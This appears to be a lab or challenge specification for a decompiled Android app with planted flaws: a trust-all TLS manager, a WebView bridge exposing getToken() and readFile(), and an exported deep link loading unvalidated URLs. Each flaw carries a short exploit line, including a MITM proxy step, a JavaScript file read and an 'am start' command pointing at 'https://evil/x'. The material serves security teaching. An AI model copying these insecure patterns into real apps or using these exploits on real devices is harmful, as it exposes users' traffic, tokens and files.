stack: Android APK (decompiled) — broken TLS trust + dangerous WebView (rung 3 of the mobile ladder)

vulns.desc: InsecureTrust is a custom X509TrustManager whose checkServerTrusted()/checkClientTrusted() bodies are empty (accept ANY certificate), getAcceptedIssuers() returns an empty array, and a HostnameVerifier returns true for every hostname — with no certificate pinning anywhere. The app trusts any TLS cert, so a network attacker MITMs all traffic.
vulns.exploit: grep -E 'X509TrustManager|checkServerTrusted|HostnameVerifier' smali/ ; proxy with a self-signed CA -> traffic decrypted, no warning.

vulns.desc: WebViewActivity enables JavaScript, setAllowFileAccess/setAllowFileAccessFromFileURLs/setAllowUniversalAccessFromFileURLs(true), and adds a native JsBridge as window.android exposing getToken() and readFile(path) to every loaded page — while loading an attacker-controlled URL. Any page can steal the session token and read arbitrary app files (file:// + universal access).
vulns.exploit: grep -E 'addJavascriptInterface|setAllowUniversalAccessFromFileURLs|JavascriptInterface' smali/ ; load file:///... or a remote page -> window.android.readFile('/data/data/.../shared_prefs/..').

vulns.desc: WebViewActivity is android:exported="true" with a BROWSABLE deep-link (netforge://open) and loads the URL from the incoming intent's 'url' extra with no validation — so any other app, or any web page, drives the vulnerable WebView with a chosen URL.
vulns.exploit: am start -a android.intent.action.VIEW -d 'netforge://open' --es url 'https://evil/x' com.netforge.app ; or a web link netforge://open?... .
